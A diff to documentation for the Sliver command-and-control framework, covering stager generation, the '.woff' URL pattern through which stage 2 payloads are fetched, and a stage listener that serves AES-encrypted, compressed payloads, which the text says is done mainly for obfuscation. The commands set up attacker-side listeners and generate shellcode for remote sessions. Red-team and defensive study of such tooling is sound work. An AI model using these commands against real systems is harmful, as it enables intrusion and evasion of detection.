@@ -61,10 +61,11 @@ sliver > generate stager --lhost 192.168.122.1 --lport 1234 --save /tmp
 By default, the staging protocol used is TCP. The `--protocol` flag can be used to specify either `tcp` or `http` as the staging protocol.
 The generated shellcode can now be used on the target system to start a new Sliver session.
 
-## Custom stagers
+## Custom Stagers
 
 One thing to consider while writing or using a custom stager, especially for the HTTP protocol, is that the Sliver server will only serve stage 2 payloads on specifically defined URLs. Indeed, since the HTTP staging listener is reusing the regular HTTP listener, it follows the same [procedural HTTP protocol](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#procedural-http-c2).
-The extension used to retrieve a stage 2 payload is `.woff`.
+
+The file extension used to retrieve a stage 2 payload is `.woff`.
 
 As a result, if you want to implement your own stager to fetch a stage 2 payload via HTTP, you need to query a URL that looks like this: `http://SLIVER-SERVER:STAGING-PORT/whatever.woff`.
 
@@ -113,6 +114,7 @@ namespace SliverStager
 
 ## Encrypted Stage Example 
 
+Sliver supports encryption and compression when serving stages. Compression options are `zlib`, `gzip`, and `deflate` (level 9). Encryption is done via AES-CBC-128, since this encryption is primarily for obfuscation we don't really need a more secure cipher mode.
 
 ```
 stage-listener --url http://192.168.0.52:80 --profile win-shellcode --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
